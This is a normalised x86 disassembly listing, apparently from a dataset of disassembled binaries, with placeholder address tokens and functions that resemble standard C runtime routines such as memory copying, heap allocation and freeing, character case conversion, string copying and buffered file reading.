call sub_425ccf
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x2c ]
call sub_4217ab
pop esi
pop ebp
retn
sub_421986
push ebp
mov ebp esp
push 0x20
call sub_42257f
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
mov ecx eax
call sub_42170a
pop ebp
retn
sub_4219cd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_4219ec
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42168a
push rw-data
call sub_4219cd
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_4216e6
leave
retn
sub_421a16
push ebp
mov ebp esp
push esi
call sub_426094
mov esi [ ebp + 0x8 ]
push 0x2
push 0x100
mov [ esi ] eax
call sub_4266a7
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
call sub_425ea7
and [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] eax
push 0x200
call sub_425ea7
push eax
push [ esi + 0x4 ]
call sub_424fc0
add esp 0xc
mov [ esi + 0x8 ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
push eax
call sub_426041
pop ecx
mov [ esi + 0xc ] eax
call sub_4260ba
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
sub_421a82
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_4260ba
mov edi [ eax + 0x8 ]
call sub_426094
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov [ ebp - 0x8 ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0xc ] eax
call sub_425ea7
mov edx [ ebp - 0xc ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_426016
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
push 0x2
mov [ ebp + 0xc ] dl
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x100
push edi
push 0x0
call sub_426663
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_421b7f
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_4260ba
mov edi [ eax + 0x8 ]
call sub_426094
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
mov [ ebp - 0x8 ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0xc ] eax
call sub_425ea7
mov edx [ ebp - 0xc ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_425feb
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
push 0x2
mov [ ebp + 0xc ] dl
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push edi
push 0x0
call sub_426663
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_421c7c
push ebp
mov ebp esp
push ecx
push 0x2
lea ecx [ ebp - 0x4 ]
call sub_42168a
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x1
mov eax [ ecx + 0x8 ]
mov [ eax * 4 + rw-data ] ecx
mov eax [ ecx + 0x8 ]
lea ecx [ ebp - 0x4 ]
inc [ eax + rw-data ]
call sub_4216e6
leave
retn
cmp eax ecx
je r-xdata
lea eax [ edx + 0x1 ]
mov [ ecx + 0x8 ] eax
cmp eax 0x8
jb r-xdata
mov edx [ ecx + 0x8 ]
mov eax [ edx * 4 + rw-data ]
test eax eax
je r-xdata
sub_421cce
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_421cf3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx esi
call sub_421d30
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
dec [ eax + rw-data ]
mov al [ eax + rw-data ]
test al al
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_40d130
push esi
call j_sub_422732#2
pop ecx
sub_421d30
push esi
push edi
push 0x0
mov edi ecx
call sub_421cce
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
mov eax [ edi + 0x2c ]
and [ edi + 0x28 ] 0x0
test eax eax
je r-xdata
mov esi [ eax ]
push eax
call j_sub_422732#2
pop ecx
mov eax esi
test esi esi
jne r-xdata
and [ edi + 0x2c ] 0x0
pop edi
pop esi
retn
mov esi [ eax ]
push eax
call j_sub_422732#2
pop ecx
mov eax esi
test esi esi
jne r-xdata
sub_421d72
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor ecx ecx
mov edi eax
mov edx eax
and edi 0x4
and edx 0x80
inc ecx
test al 0x40
je r-xdata
test al 0x8
je r-xdata
or eax ecx
and eax 0xffffff3b
xor esi esi
or eax 0x2
cmp [ esi * 4 + r--data ] 0x0
jne r-xdata
mov ecx [ esi * 4 + r--data ]
inc esi
test ecx ecx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_421e1d
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test al 0xa
je r-xdata
pop edi
pop esi
pop ebp
retn
test edi edi
je r-xdata
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_421e1d
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_4231ef
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_4232da
pop ecx
jmp r-xdata
sub_421e80
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0xa
jb r-xdata
mov eax [ ecx * 4 + rw-data ]
inc ecx
push eax
mov [ rw-data ] ecx
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_421ea9
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je sub_4278bb
push [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
sub_421ef0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_4223c4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4222c8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4223c4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_42213c ]
jmp [ ecx * 4 + jump_table_4221bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422228 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4223c4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_422228 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4223c4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4223c4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4223c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422228 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422228 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422228 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_422228 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_422542
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_427990
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_422560
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_422534
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_42257f
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_42276a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_429a64
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_423953
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_42569b
int3
sub_4225ce
push esi
push 0x4
push 0x20
call sub_4266a7
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4225fd
push 0xc
push r--data
call sub_429ad0
call sub_42365f
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_42263d
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422637
mov eax esi
call sub_429b15
retn
sub_42263d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_429a97
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_42673a
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_42673a
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_422732
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_427b11
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_427b24
pop ecx
mov [ esi ] eax
pop esi
sub_42276a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_429a64
pop ecx
call sub_427b11
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_429cc5
push 0x1e
call sub_429d22
push 0xff
call sub_4234f4
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_427b11
mov [ eax ] ebx
push esi
call sub_429a64
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_427b11
mov [ eax ] ebx
sub_4227fc
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_427b11
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_427b11
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
sub_422868
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427b11
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_427b11
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
sub_4228c4
push 0xc
push r--data
call sub_429ad0
xor ecx ecx
mov [ ebp - 0x1c ] ecx
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
cmp [ ebx ] cx
setne al
test eax eax
je r-xdata
call sub_429b15
retn
call sub_42a26c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ edi ] ax
jne r-xdata
call sub_427b11
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_42a384
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422986
mov eax edi
call sub_427b11
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_42a620
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4229af
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
jbe r-xdata
test esi esi
je r-xdata
push [ ebp + 0xc ]
push 0x0
push ecx
call sub_427900
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
ja r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0xc ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_42b64b
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
cmp ebx 0x7fffffff
ja r-xdata
xor edx edx
cmp ebx 0x7fffffff
jbe r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] al
inc edx
dec ebx
dec ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax ebx
mov eax ebx
div ecx
mov eax ebx
mov eax 0x7fffffff
div ecx
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
ja r-xdata
mov eax ebx
mov [ ebp - 0x10 ] ebx
call sub_427b11
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_427900
add esp 0xc
push eax
push [ ebp - 0x4 ]
push esi
call sub_42b76c
pop ecx
push eax
call sub_42b898
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push eax
push [ esi ]
push ecx
push [ ebp - 0x4 ]
call sub_423a5b
mov eax [ ebp - 0x10 ]
sub [ esi + 0x4 ] eax
